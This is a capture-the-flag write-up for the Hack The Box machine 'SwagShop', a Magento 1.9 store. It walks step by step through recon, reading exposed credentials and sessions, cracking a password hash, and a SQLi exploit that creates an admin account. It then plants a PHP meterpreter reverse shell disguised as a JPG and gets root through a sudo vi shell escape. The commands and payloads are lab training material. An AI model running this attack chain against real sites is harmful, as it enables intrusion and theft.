Opening with Nmap for recon:
```
sudo nmap -sS -sV -p- -oA swagshop_nmap 10.10.10.140

Nmap scan report for 10.10.10.140
Host is up (0.056s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Port 80 is running a Magento e-commerce site with a copyright date of 2014 in the footer.

Gobuster for additional content discovery
```
gobuster dir -u 10.10.10.140 -w ~/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.140
[+] Threads:        10
[+] Wordlist:       /Users/Daniel.Murphy/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/07/26 11:53:35 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/app (Status: 301)
/downloader (Status: 301)
/errors (Status: 301)
/favicon.ico (Status: 200)
/includes (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/lib (Status: 301)
/media (Status: 301)
/pkginfo (Status: 301)
/server-status (Status: 403)
/shell (Status: 301)
/skin (Status: 301)
/var (Status: 301)
===============================================================
2019/07/26 11:53:58 Finished
===============================================================
```

http://10.10.10.140/app/etc/local.xml gives us some mysql credentials. I tried using these as SSH login credentials, but no joy.
http://10.10.10.140/downloader/ ggives us a login page for Magento Connect Manager
http://10.10.10.140/var/package/Mage_All_Latest-1.9.0.0.xml suggests we're looking at a Magento 1.9 installation
http://10.10.10.140/var/session/ has a bunch of files with session information in them

I had a look at a 50KB file called sess_1iaam6otvkj4rtc4tm2qkg2g56 and found a username and password hash. A quick google result tells me that magento 1.9 used MD5 to hash passwords and the 2 characters after the colon in the password hash string were the salt. So I now have a username "forme", email address "email@example.com" and a password hash and salt "0a8335493c9fccd648ba53c601e3d67c:rp". Time to break out hashcat. CONCAT(MD5('qXpassword'), ':qX') where qX is the salt string.

```
hashcat -m 20 -a 0 -w 2 hashfile rockyou.txt
```
Result was "forme" but that's too short when I tried to log into the Magento frontend.


Let's try using the SQLi exploit described at https://medium.com/magebit/magento-web-exploit-case-studies-bac57add8c0e to create an admin user, which exploits a vuln fully described at https://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/

```
python sqliexploit.py http://10.10.10.140
WORKED
Check http://10.10.10.140/admin with creds ypwq:123
```

The URL mentioned in the exploit output is wrong, but if you navigate to http://10.10.10.140/index.php/admin you can login with those credentials

Now we have the ability to use the Magento admin panel, we're going to get a shell running as the user that the apache process is running as using the "Froghopper" attack documented https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.16.58 LPORT=4444 -o shell.
```

Enable template symlinks in System->Configuration->Advanced->Developer->Template Settings->Allow Symlinks = Yes
Next we upload our "JPG" that totally isn't a JPG by attaching it as an image to the default product category (Catalog->Manage Categories->Default Category->Image)
Next we setup our metasploit listener:
```
msfconsole
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.10.16.58
LHOST => 10.10.16.58
msf5 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.58:4444
```

Now we go an add a block to a new newsletter template to fetch our malicious JPG and include it in the newsletter template
```
{{block type='core/template' template='../../../../../../media/catalog/category/shell.jpg'}}
```

Give the template a name and subject so it passes validation and hit preview.

```
[*] Sending stage (38247 bytes) to 10.10.10.140
[*] Meterpreter session 1 opened (10.10.16.58:4444 -> 10.10.10.140:57722) at 2019-07-26 13:26:07 +0100
meterpreter > getuid
Server username: www-data (33)<Paste>
```

So now we have a shell as www-data, which is usually quite unpriviledged.
```
meterpreter > ls
Listing: /var/www/html
======================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100644/rw-r--r--  5667    fil   2014-05-07 19:58:50 +0100  .htaccess
100644/rw-r--r--  4568    fil   2014-05-07 19:58:50 +0100  .htaccess.sample
100644/rw-r--r--  10679   fil   2014-05-07 19:58:52 +0100  LICENSE.html
100644/rw-r--r--  10410   fil   2014-05-07 19:58:52 +0100  LICENSE.txt
100644/rw-r--r--  10421   fil   2014-05-07 19:58:52 +0100  LICENSE_AFL.txt
100644/rw-r--r--  585086  fil   2014-05-07 19:58:50 +0100  RELEASE_NOTES.txt
100644/rw-r--r--  2834    fil   2014-05-07 19:58:52 +0100  api.php
40755/rwxr-xr-x   4096    dir   2014-05-07 19:58:52 +0100  app
100644/rw-r--r--  2831    fil   2014-05-07 19:58:52 +0100  cron.php
100644/rw-r--r--  717     fil   2014-05-07 19:58:50 +0100  cron.sh
40755/rwxr-xr-x   4096    dir   2019-05-08 12:13:36 +0100  downloader
40755/rwxr-xr-x   4096    dir   2014-05-07 19:58:50 +0100  errors
100644/rw-r--r--  1150    fil   2014-05-07 19:58:50 +0100  favicon.ico
100644/rw-r--r--  5979    fil   2014-05-07 19:58:50 +0100  get.php
40755/rwxr-xr-x   4096    dir   2014-05-07 19:58:52 +0100  includes
100644/rw-r--r--  2642    fil   2014-05-07 19:58:50 +0100  index.php
100644/rw-r--r--  2366    fil   2014-05-07 19:58:52 +0100  index.php.sample
100644/rw-r--r--  6441    fil   2014-05-07 19:58:52 +0100  install.php
40755/rwxr-xr-x   4096    dir   2014-05-07 19:58:50 +0100  js
40755/rwxr-xr-x   4096    dir   2014-05-07 19:58:50 +0100  lib
100644/rw-r--r--  1319    fil   2014-05-07 19:58:50 +0100  mage
40777/rwxrwxrwx   4096    dir   2019-05-08 11:00:00 +0100  media
100644/rw-r--r--  886     fil   2014-05-07 19:58:52 +0100  php.ini.sample
40755/rwxr-xr-x   4096    dir   2014-05-07 19:58:52 +0100  pkginfo
40755/rwxr-xr-x   4096    dir   2014-05-07 19:58:52 +0100  shell
40755/rwxr-xr-x   4096    dir   2014-05-07 19:58:50 +0100  skin
40755/rwxr-xr-x   4096    dir   2019-07-26 12:50:29 +0100  var

meterpreter > cd ..
meterpreter > pwd
/var/www
meterpreter > ls
Listing: /var/www
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100600/rw-------  591   fil   2019-05-08 13:12:30 +0100  .viminfo
40755/rwxr-xr-x   4096  dir   2019-05-08 13:12:30 +0100  html

meterpreter > cd ../../
meterpreter > ls
Listing: /
==========

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
40755/rwxr-xr-x   4096      dir   2019-05-02 19:53:49 +0100  bin
40755/rwxr-xr-x   1024      dir   2019-05-02 19:56:39 +0100  boot
40755/rwxr-xr-x   3920      dir   2019-07-22 00:28:03 +0100  dev
40755/rwxr-xr-x   4096      dir   2019-05-08 13:11:43 +0100  etc
40755/rwxr-xr-x   4096      dir   2019-05-02 19:48:40 +0100  home
100644/rw-r--r--  39840285  fil   2019-05-02 19:56:39 +0100  initrd.img
100644/rw-r--r--  39481711  fil   2019-05-02 19:56:20 +0100  initrd.img.old
40755/rwxr-xr-x   4096      dir   2019-05-02 19:54:29 +0100  lib
40755/rwxr-xr-x   4096      dir   2019-05-02 19:53:00 +0100  lib64
40700/rwx------   16384     dir   2019-05-02 19:36:29 +0100  lost+found
40755/rwxr-xr-x   4096      dir   2019-05-02 19:36:38 +0100  media
40755/rwxr-xr-x   4096      dir   2017-08-01 12:16:21 +0100  mnt
40755/rwxr-xr-x   4096      dir   2017-08-01 12:16:21 +0100  opt
40555/r-xr-xr-x   0         dir   2019-07-22 00:27:52 +0100  proc
40700/rwx------   4096      dir   2019-05-08 14:21:30 +0100  root
40755/rwxr-xr-x   920       dir   2019-07-22 11:25:06 +0100  run
40755/rwxr-xr-x   12288     dir   2019-05-02 19:54:29 +0100  sbin
40755/rwxr-xr-x   4096      dir   2019-05-02 19:55:50 +0100  snap
40755/rwxr-xr-x   4096      dir   2017-08-01 12:16:21 +0100  srv
40555/r-xr-xr-x   0         dir   2019-07-22 00:27:56 +0100  sys
41777/rwxrwxrwx   4096      dir   2019-07-26 13:19:12 +0100  tmp
40755/rwxr-xr-x   4096      dir   2019-05-02 19:36:36 +0100  usr
40755/rwxr-xr-x   4096      dir   2019-05-02 19:46:14 +0100  var
100600/rw-------  7197208   fil   2019-04-03 22:23:13 +0100  vmlinuz
100600/rw-------  7095888   fil   2017-07-18 16:00:58 +0100  vmlinuz.old

meterpreter > pwd
/
meterpreter > cd home
meterpreter > ls
Listing: /home
==============

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40755/rwxr-xr-x  4096  dir   2019-05-08 14:21:09 +0100  haris

meterpreter > cd haris
meterpreter > ls
Listing: /home/haris
====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100600/rw-------  54    fil   2019-05-02 19:56:49 +0100  .Xauthority
20666/rw-rw-rw-   0     cha   2019-07-22 00:28:02 +0100  .bash_history
100644/rw-r--r--  220   fil   2019-05-02 19:48:40 +0100  .bash_logout
100644/rw-r--r--  3771  fil   2019-05-02 19:48:40 +0100  .bashrc
40700/rwx------   4096  dir   2019-05-02 19:49:31 +0100  .cache
100600/rw-------  1     fil   2019-05-08 14:20:30 +0100  .mysql_history
100644/rw-r--r--  655   fil   2019-05-02 19:48:40 +0100  .profile
100644/rw-r--r--  0     fil   2019-05-02 19:49:38 +0100  .sudo_as_admin_successful
100644/rw-r--r--  33    fil   2019-05-08 14:01:36 +0100  user.txt

meterpreter > cat user.txt
a448877277e82f05e5ddf9f90aefbac8
meterpreter > sysinfo
Computer    : swagshop
OS          : Linux swagshop 4.4.0-146-generic #172-Ubuntu SMP Wed Apr 3 09:00:08 UTC 2019 x86_64

```
A quick google search for that linux kernel version leads to https://www.exploit-db.com/exploits/44298 which is a local priv esc vuln for this kernel

```
searchsploit -p 44298
Exploit: Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/44298
     Path: /usr/local/opt/exploitdb/share/exploitdb/exploits/linux/local/44298.c
File Type: c program text, ASCII text, with CRLF line terminators

Copied EDB-ID #44298's path to the clipboard.
cp /usr/local/opt/exploitdb/share/exploitdb/exploits/linux/local/44298.c ./
```

The exploit requires some linux kernel headers, so we'll compile this in a docker container

```
docker run --rm -it -v "$PWD":/usr/src/myapp -w /usr/src/myapp buildpack-deps:xenial bash
curl -O https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.4.146.tar.xz
tar xf linux-4.4.146.tar.xz -C /usr/src/
gcc 44298.c -o root
```

In the meterpreter session
```
upload root /tmp/root
```

When I tried to execute this, I always got an error about permissions.

More recon
```
cat /etc/sudoers
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d

www-data ALL=NOPASSWD:/usr/bin/vi /var/www/html/*
```

So we have no-password sudo access to run vi in a given directory. This is super dangerous.

```
meterpreter> shell
sudo vi /var/www/html
:set shell=/bin/sh
:shell
whoami
root
cat /root/root.txt
c2b087d66e14a652a3b86a130ac56721

   ___ ___
 /| |/|\| |\
/_| ´ |.` |_\           We are open! (Almost)
  |   |.  |
  |   |.  |         Join the beta HTB Swag Store!
  |___|.__|       https://hackthebox.store/password

                   PS: Use root flag as password!
